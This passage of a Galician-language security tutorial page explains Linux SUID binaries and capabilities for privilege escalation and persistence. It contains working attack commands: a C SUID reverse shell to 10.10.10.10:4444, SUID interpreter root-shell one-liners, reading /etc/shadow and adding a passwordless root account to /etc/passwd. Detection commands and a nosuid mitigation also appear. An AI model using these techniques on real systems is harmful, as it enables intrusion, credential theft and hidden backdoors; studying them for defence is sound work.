+<p><div class="language-c highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1&#39;&quot;</span><span class="p">);</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">}</span>
+</span></code></pre></div>
+<strong>Comandos:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>gcc<span class="w"> </span>-o<span class="w"> </span>rev_shell<span class="w"> </span>rev_shell.c
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>sudo<span class="w"> </span>chown<span class="w"> </span>root:root<span class="w"> </span>rev_shell
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>rev_shell
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Nunha terminal: nc -lvnp 4444</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># Noutra: ./rev_shell</span>
+</span></code></pre></div></p>
+<h3 id="caso-4-interpretes-pythonperlruby">Caso 4: Intérpretes (Python/Perl/Ruby)</h3>
+<p>Se o intérprete ten o bit SUID:  </p>
+<ul>
+<li>
+<p><strong>Python:</strong> 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span>-pv<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>python<span class="k">)</span><span class="w"> </span>python
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>sudo<span class="w"> </span>chown<span class="w"> </span>root:root<span class="w"> </span>python
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>python
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>./python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash -p&quot;)&#39;</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Perl:</strong> 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span>-pv<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>perl<span class="k">)</span><span class="w"> </span>perl
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sudo<span class="w"> </span>chown<span class="w"> </span>root:root<span class="w"> </span>perl
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>perl
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>./perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;$ENV{PATH}=&quot;/bin:/usr/bin&quot;; use POSIX; setuid(0); exec &quot;/bin/bash -p&quot;&#39;</span>
+</span></code></pre></div></p>
+</li>
+<li>
+<p><strong>Ruby:</strong> 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span>-pv<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>ruby<span class="k">)</span><span class="w"> </span>ruby
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>sudo<span class="w"> </span>chown<span class="w"> </span>root:root<span class="w"> </span>ruby
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>sudo<span class="w"> </span>chmod<span class="w"> </span><span class="m">4755</span><span class="w"> </span>ruby
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;Process::Sys.setuid(0); exec &quot;/bin/bash -p&quot;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/exploit.rb
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>./ruby<span class="w"> </span>/tmp/exploit.rb
+</span></code></pre></div></p>
+</li>
+</ul>
+<hr />
+<h2 id="5-linux-capabilities-alternativa-moderna-aos-suid">5. Linux Capabilities: Alternativa Moderna aos SUID</h2>
+<p>Tradicionalmente, en Linux, a seguridade era binaria: ou eras un usuario normal sen privilexios ou eras <strong>root</strong> con control total. As <strong>Capabilities</strong> permiten dividir o poder de root en pequenos fragmentos de privilexios específicos.</p>
+<p>Isto é extremadamente útil para persistencia, xa que permite que un binario realice tarefas de root sen necesidade de activar o bit SUID nin de ser propiedade de root.</p>
+<h3 id="capabilities-comuns-para-escalada-e-persistencia">Capabilities Comúns para Escalada e Persistencia:</h3>
+<ul>
+<li><strong><code>cap_setuid</code></strong>: Permite que un proceso cambie o seu UID de forma arbitraria.</li>
+<li><strong><code>cap_setgid</code></strong>: Permite que un proceso cambie o seu GID.</li>
+<li><strong><code>cap_dac_override</code></strong>: Ignora as comprobacións de permisos de lectura, escritura e execución de ficheiros (podes ler calquera ficheiro do sistema).</li>
+<li><strong><code>cap_sys_admin</code></strong>: A "capability" máis potente; permite realizar tarefas administrativas (mount, configuración de rede, etc.).</li>
+</ul>
+<h3 id="comandos-de-xestion">Comandos de Xestión:</h3>
+<ul>
+<li><strong>Ver capabilities dun ficheiro:</strong> <code>getcap /ruta/do/binario</code></li>
+<li><strong>Asignar capabilities:</strong> <code>sudo setcap cap_setuid+ep /ruta/do/binario</code></li>
+<li><strong>Eliminar capabilities:</strong> <code>sudo setcap -r /ruta/do/binario</code></li>
+</ul>
+<h3 id="exemplos-practicos">Exemplos Prácticos:</h3>
+<h4 id="a-cap_setuid-cambiar-uid">A. <code>cap_setuid</code> (Cambiar UID)</h4>
+<p>Permite que un proceso cambie o seu UID de forma arbitraria.<br />
+- <strong>Exemplo:</strong> Converter un intérprete de Python nunha ferramenta para obter root shell.<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>python3<span class="k">)</span><span class="w"> </span>./py_setuid
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>sudo<span class="w"> </span>setcap<span class="w"> </span>cap_setuid+ep<span class="w"> </span>./py_setuid
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># Uso: o proceso cambia a UID 0 e lanza bash</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>./py_setuid<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.setuid(0); os.system(&quot;/bin/bash -p&quot;)&#39;</span>
+</span></code></pre></div></p>
+<h4 id="b-cap_setgid-cambiar-gid">B. <code>cap_setgid</code> (Cambiar GID)</h4>
+<p>Permite que un proceso cambie o seu GID. É útil para acceder a ficheiros protexidos por grupos específicos (como <code>shadow</code>).<br />
+- <strong>Exemplo:</strong> Acceder aos hashes de contrasinais sen ser root, asumindo o grupo <code>shadow</code>.<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>python3<span class="k">)</span><span class="w"> </span>./py_setgid
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>sudo<span class="w"> </span>setcap<span class="w"> </span>cap_setgid+ep<span class="w"> </span>./py_setgid
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1"># Uso: asumimos GID 42 (habitual de shadow) para ler o ficheiro</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>./py_setgid<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.setregid(42, 42); os.system(&quot;cat /etc/shadow&quot;)&#39;</span>
+</span></code></pre></div></p>
+<h4 id="c-cap_dac_override-ignorar-permisos">C. <code>cap_dac_override</code> (Ignorar Permisos)</h4>
+<p>Ignora as comprobacións de permisos de lectura, escritura e execución (DAC - Discretionary Access Control). Podes ler ou escribir en calquera ficheiro do sistema, independentemente de quen sexa o dono.<br />
+- <strong>Exemplo:</strong> Ler <code>/etc/shadow</code> directamente ou modificar <code>/etc/passwd</code> para engadir un usuario.<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>python3<span class="k">)</span><span class="w"> </span>./py_dac
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>sudo<span class="w"> </span>setcap<span class="w"> </span>cap_dac_override+ep<span class="w"> </span>./py_dac
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="c1"># Uso: ler un ficheiro que só root pode ver</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>./py_dac<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(open(&quot;/etc/shadow&quot;).read())&#39;</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c1"># Uso: engadir unha liña a /etc/passwd (moi perigoso)</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>./py_dac<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;open(&quot;/etc/passwd&quot;, &quot;a&quot;).write(&quot;hacker::0:0:hacker:/root:/bin/bash\n&quot;)&#39;</span>
+</span></code></pre></div></p>
+<h4 id="d-cap_sys_admin-o-pequeno-root">D. <code>cap_sys_admin</code> (O "Pequeno Root")</h4>
+<p>A capability máis potente. Permite realizar unha enorme variedade de tarefas administrativas, como montar sistemas de ficheiros, configurar a rede ou cambiar o nome do host.  </p>
+<ul>
+<li><strong>Exemplo:</strong> Cambiar o nome da máquina en RAM<br />
+A syscall <code>sethostname</code> cambia o nome na memoria do sistema, pero non no ficheiro de configuración.
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>python3<span class="k">)</span><span class="w"> </span>./py_sysadmin
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>sudo<span class="w"> </span>setcap<span class="w"> </span>cap_sys_admin+ep<span class="w"> </span>./py_sysadmin
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c1"># Uso: cambiar o hostname do sistema a través do módulo socket</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>./py_sysadmin<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket; socket.sethostname(&quot;pwned-machine&quot;)&#39;</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># Verifica con: hostname (na RAM cambiou o nome do equipo pero /etc/hostname segue anterior ao cambio)  </span>
+</span></code></pre></div></li>
+</ul>
+<details class="abstract">
+<summary>Cambio Volátil vs Persistente</summary>
+<p>Lembra que <code>cap_sys_admin</code> permite modificar o comportamento do sistema en execución (RAM), mentres que para que un cambio sobreviva a un reinicio, normalmente necesitarás <code>cap_dac_override</code> para modificar os ficheiros de configuración en disco.  </p>
+</details>
+<ul>
+<li><strong>Exemplo:</strong> Montar un disco para manipular datos.<br />
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>sudo<span class="w"> </span>cp<span class="w"> </span><span class="k">$(</span>which<span class="w"> </span>python3<span class="k">)</span><span class="w"> </span>./py_sysadmin
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>sudo<span class="w"> </span>setcap<span class="w"> </span>cap_sys_admin+ep<span class="w"> </span>./py_sysadmin
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="c1"># Uso: montar un sistema de ficheiros tmpfs sobre un directorio restrinxido</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># Como Python non ten os.mount, usamos ctypes para falar coa librería de C do sistema (libc).</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="c1"># Exemplo para un tmpfs de 100MB</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>./py_sysadmin<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import ctypes; ctypes.CDLL(&quot;libc.so.6&quot;).mount(b&quot;none&quot;, b&quot;/mnt&quot;, b&quot;tmpfs&quot;, 0, b&quot;size=100M&quot;)&#39;</span>
+</span></code></pre></div></li>
+</ul>
+<details class="abstract">
+<summary>tmpfs</summary>
+<ul>
+<li>Que é tmpfs?: Como indica o seu nome (temporary file system), é un sistema de ficheiros que reside enteiramente na memoria RAM (e no swap se fose necesario). Non escribe nada no disco físico.  </li>
+<li>O límite do 50%: Por defecto, cando montas un tmpfs sen especificar un tamaño máximo, o kernel de Linux asígnalle un límite teórico do 50% da memoria RAM total do sistema.  </li>
+<li>Non "rouba" a RAM: O sistema só usará a RAM real a medida que vaias metendo ficheiros dentro de /mnt. Se o cartafol está baleiro, o consumo de RAM é practicamente cero.  </li>
+<li>Velocidade extrema: Ao traballar directamente en RAM, a lectura e escritura en /mnt será moito máis rápida que en calquera outra parte do disco.  </li>
+<li>Volatilidade: No momento en que reinicies a máquina ou desmontes o cartafol (sudo umount /mnt), todo o que houbera dentro desaparecerá para sempre, xa que a RAM bórrase ao perder a corrente.</li>
+</ul>
+</details>
+<hr />
+<h2 id="6-resumo-de-seguridade">6. Resumo de Seguridade</h2>
+<ol>
+<li><strong>Detección de SUID:</strong> <code>find / -perm -4000 -type f 2&gt;/dev/null</code>.  </li>
+<li><strong>Detección de Capabilities:</strong> <code>getcap -r / 2&gt;/dev/null</code>.</li>
+<li><strong>Prevención:</strong> Montar <code>/home</code> e <code>/tmp</code> con <code>nosuid</code> (que tamén bloquea o uso de capabilities en binarios desas particións en moitos sistemas modernos).  </li>
+<li><strong>A Regra de Ouro:</strong> Se usas <code>system()</code>, executa <code>setuid(0)</code> antes. Se queres evitar restricións da shell ou ser indetectable, usa <code>execve()</code>, intérpretes ou, se tes oportunidade, asigna <strong>Capabilities</strong> a binarios discretos.</li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../../js/opera.js"></script>
+      
+        <script src="../../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
